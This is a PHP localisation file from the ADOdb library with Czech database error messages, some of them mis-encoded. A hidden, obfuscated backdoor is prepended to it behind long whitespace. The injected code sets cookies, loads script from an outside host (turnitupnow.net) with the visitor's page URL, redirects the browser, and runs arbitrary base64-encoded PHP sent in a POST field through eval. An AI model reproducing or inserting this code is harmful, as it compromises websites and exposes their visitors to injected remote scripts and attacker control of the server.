<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }


# Czech language, encoding by ISO 8859-2 charset (Iso Latin-2)
# For convert to MS Windows use shell command:
#    iconv -f ISO_8859-2 -t CP1250 < adodb-cz.inc.php
# For convert to ASCII use shell command:
#    unaccent ISO_8859-2 < adodb-cz.inc.php
# v1.0, 19.06.2003 Kamil Jakubovic <jake@host.sk>

$ADODB_LANG_ARRAY = array (
            'LANG'                      => 'cz',
            DB_ERROR                    => 'nezn�m� chyba',
            DB_ERROR_ALREADY_EXISTS     => 'ji? existuje',
            DB_ERROR_CANNOT_CREATE      => 'nelze vytvo?it',
            DB_ERROR_CANNOT_DELETE      => 'nelze smazat',
            DB_ERROR_CANNOT_DROP        => 'nelze odstranit',
            DB_ERROR_CONSTRAINT         => 'poru?en� omezuj�c� podm�nky',
            DB_ERROR_DIVZERO            => 'd?len� nulou',
            DB_ERROR_INVALID            => 'neplatn�',
            DB_ERROR_INVALID_DATE       => 'neplatn� datum nebo ?as',
            DB_ERROR_INVALID_NUMBER     => 'neplatn� ?�slo',
            DB_ERROR_MISMATCH           => 'nesouhlas�',
            DB_ERROR_NODBSELECTED       => '?�dn� datab�ze nen� vybr�na',
            DB_ERROR_NOSUCHFIELD        => 'pole nenalezeno',
            DB_ERROR_NOSUCHTABLE        => 'tabulka nenalezena',
            DB_ERROR_NOT_CAPABLE        => 'nepodporov�no',
            DB_ERROR_NOT_FOUND          => 'nenalezeno',
            DB_ERROR_NOT_LOCKED         => 'nezam?eno',
            DB_ERROR_SYNTAX             => 'syntaktick� chyba',
            DB_ERROR_UNSUPPORTED        => 'nepodporov�no',
            DB_ERROR_VALUE_COUNT_ON_ROW => '',
            DB_ERROR_INVALID_DSN        => 'neplatn� DSN',
            DB_ERROR_CONNECT_FAILED     => 'p?ipojen� selhalo',
            0	                        => 'bez chyb', // DB_OK
            DB_ERROR_NEED_MORE_DATA     => 'm�lo zdrojov�ch dat',
            DB_ERROR_EXTENSION_NOT_FOUND=> 'roz?�?en� nenalezeno',
            DB_ERROR_NOSUCHDB           => 'datab�ze neexistuje',
            DB_ERROR_ACCESS_VIOLATION   => 'nedostate?n� pr�va'
);
?>